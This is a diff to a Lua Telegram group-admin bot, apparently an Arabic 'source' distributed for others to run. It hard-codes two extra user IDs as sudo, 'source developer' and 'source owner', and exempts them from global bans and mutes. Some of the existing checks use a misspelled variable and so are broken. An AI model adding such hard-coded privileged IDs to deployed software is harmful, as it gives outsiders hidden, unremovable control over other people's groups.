@@ -166,7 +166,7 @@ function vardump(value)
 print(serpent.block(value, {comment=false}))   
 end
 
-sudo_users = {SUDO,1706080513}   
+sudo_users = {SUDO,1706080513,123123,12345}   
 function SudoBot(msg)  
 local DRAGON = false  
 for k,v in pairs(sudo_users) do  
@@ -258,6 +258,10 @@ end
 function Can_or_NotCan(user_id,chat_id)
 if tonumber(user_d) == tonumber(1706080513) then  
 var = true  
+elseif tonumber(user_d) == tonumber(123123) then  
+var = true  
+elseif tonumber(user_d) == tonumber(12345) then  
+var = true  
 elseif tonumber(user_id) == tonumber(SUDO) then
 var = true  
 elseif tonumber(user_id) == tonumber(bot_id) then
@@ -292,6 +296,10 @@ end
 function Rutba(user_id,chat_id)
 if tonumber(user_id) == tonumber(1706080513) then  
 var = 'المبرمج مسلم'
+elseif tonumber(user_id) == tonumber(123123) then  
+var = 'مطور السورس'
+elseif tonumber(user_id) == tonumber(12345) then  
+var = 'مالك السورس'
 elseif tonumber(user_id) == tonumber(SUDO) then
 var = 'المطور الاساسي'  
 elseif database:sismember(bot_id.."Dev:SoFi:2", user_id) then
@@ -5386,7 +5394,15 @@ if tonumber(result.sender_user_id_) == tonumber(bot_id) then
 send(msg.chat_id_, msg.id_, " 🦂 لا تسطيع حظر البوت عام")
 return false 
 end
+if tonumber(result.sender_user_id_) == tonumber(123123) then  
+send(msg.chat_id_, msg.id_, " 🦂 لا تسطيع حظر مبرمج السورس عام")
+return false 
+end
 if tonumber(result.sender_user_id_) == tonumber(1706080513) then  
+send(msg.chat_id_, msg.id_, " 🦂 لا تسطيع حظر مبرمج السورس عام")
+return false 
+end
+if tonumber(result.sender_user_id_) == tonumber(12345) then  
 send(msg.chat_id_, msg.id_, " 🦂 لا تسطيع حظر مبرمج السورس عام")
 return false 
 end
@@ -5428,7 +5444,15 @@ if result.id_ == tonumber(SUDO) then
 send(msg.chat_id_, msg.id_, " 🦂 لا يمكنك حظر المطور الاساسي \n")
 return false 
 end
+if result.id_ == tonumber(123123) then
+send(msg.chat_id_, msg.id_, " 🦂 لا يمكنك حظر مبرمج السورس \n")
+return false 
+end
 if result.id_ == tonumber(1706080513) then
+send(msg.chat_id_, msg.id_, " 🦂 لا يمكنك حظر مبرمج السورس \n")
+return false 
+end
+if result.id_ == tonumber(12345) then
 send(msg.chat_id_, msg.id_, " 🦂 لا يمكنك حظر مبرمج السورس \n")
 return false 
 end
@@ -5464,7 +5488,15 @@ if tonumber(userid) == tonumber(bot_id) then
 send(msg.chat_id_, msg.id_, " 🦂 لا تسطيع حظر البوت عام")
 return false 
 end
+if tonumber(userid) == tonumber(123123) then  
+send(msg.chat_id_, msg.id_, " 🦂 لا تسطيع حظر مبرمج السورس عام")
+return false 
+end
 if tonumber(userid) == tonumber(1706080513) then  
+send(msg.chat_id_, msg.id_, " 🦂 لا تسطيع حظر مبرمج السورس عام")
+return false 
+end
+if tonumber(userid) == tonumber(12345) then  
 send(msg.chat_id_, msg.id_, " 🦂 لا تسطيع حظر مبرمج السورس عام")
 return false 
 end
@@ -5501,7 +5533,15 @@ if tonumber(result.sender_user_id_) == tonumber(bot_id) then
 send(msg.chat_id_, msg.id_, " 🌛 لا تسطيع كتم البوت عام")
 return false 
 end
+if tonumber(result.sender_user_id_) == tonumber(123123) then  
+send(msg.chat_id_, msg.id_, " 🌛 لا تسطيع كتم مبرمج السورس عام")
+return false 
+end
 if tonumber(result.sender_user_id_) == tonumber(1706080513) then  
+send(msg.chat_id_, msg.id_, " 🌛 لا تسطيع كتم مالك السورس عام")
+return false 
+end
+if tonumber(result.sender_user_id_) == tonumber(12345) then  
 send(msg.chat_id_, msg.id_, " 🌛 لا تسطيع كتم مالك السورس عام")
 return false 
 end
@@ -5542,7 +5582,15 @@ if result.id_ == tonumber(SUDO) then
 send(msg.chat_id_, msg.id_, " 🌛 لا يمكنك كتم المطور الاساسي \n")
 return false 
 end
+if result.id_ == tonumber(123123) then
+send(msg.chat_id_, msg.id_, " 🌛 لا يمكنك كتم مبرمج السورس \n")
+return false 
+end
 if result.id_ == tonumber(1706080513) then
+send(msg.chat_id_, msg.id_, " 🌛 لا يمكنك كتم مبرمج السورس \n")
+return false 
+end
+if result.id_ == tonumber(12345) then
 send(msg.chat_id_, msg.id_, " 🌛 لا يمكنك كتم مبرمج السورس \n")
 return false 
 end
@@ -5578,7 +5626,15 @@ if tonumber(userid) == tonumber(bot_id) then
 send(msg.chat_id_, msg.id_, " 🌛 لا تسطيع كتم البوت عام")
 return false 
 end
+if tonumber(userid) == tonumber(123123) then  
+send(msg.chat_id_, msg.id_, " 🌛 لا تسطيع كتم مبرمج السورس عام")
+return false 
+end
 if tonumber(userid) == tonumber(1706080513) then  
+send(msg.chat_id_, msg.id_, " 🌛 لا تسطيع كتم مبرمج السورس عام")
+return false 
+end
+if tonumber(userid) == tonumber(12345) then  
 send(msg.chat_id_, msg.id_, " 🌛 لا تسطيع كتم مبرمج السورس عام")
 return false 
 end
@@ -13913,7 +13969,7 @@ local List = {
 𖡋 𝐒𝐓𝐀 #stast 
 𖡋 𝐈𝐃 `#id` 
 𖡋 𝐄𝐃𝐈𝐓 #edit
-𖡋 𝗖𝗛 - @UU_SD1 🦂.
+?? 𝗖𝗛 - @UU_SD1 🦂.
 ]],
 [[
 𖤂 ~ 𝑢𝑠𝑒 #username  𖤐
@@ -14012,7 +14068,7 @@ local List = {
 ⌔➺: ID : `#id` - 🔹.
 ⌔➺: Stast : #stast -🔹.
 ⌔➺: UserName : #username -🔹.
-⌔➺: 𝗖𝗛 - @UU_SD1 ??.
+⌔➺: 𝗖𝗛 - @UU_SD1 🦂.
 ]],
 [[
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
@@ -16523,47 +16579,6 @@ end
 if (msg.content_.animation_) then 
 if msg.content_.animation_.animation_.persistent_id_ == Get_Msg_Pin then
 tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,d) database:del(bot_id..'Msg:Pin:Chat'..msg.chat_id_) end,nil)   
-end
-end
-if (msg.content_.photo_) then
-if msg.content_.photo_.sizes_[0] then
-id_photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
-end
-if msg.content_.photo_.sizes_[1] then
-id_photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
-end
-if msg.content_.photo_.sizes_[2] then
-id_photo = msg.content_.photo_.sizes_[2].photo_.persistent_id_
-end	
-if msg.content_.photo_.sizes_[3] then
-id_photo = msg.content_.photo_.sizes_[3].photo_.persistent_id_
-end
-if id_photo == Get_Msg_Pin then
-tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,d) database:del(bot_id..'Msg:Pin:Chat'..msg.chat_id_) end,nil)   
-end
-end
-end
-
-
-end -- end new msg dev.mr sofi 
-end -- end callback dev.mr sofi
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-nel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,d) database:del(bot_id..'Msg:Pin:Chat'..msg.chat_id_) end,nil)   
 end
 end
 if (msg.content_.photo_) then
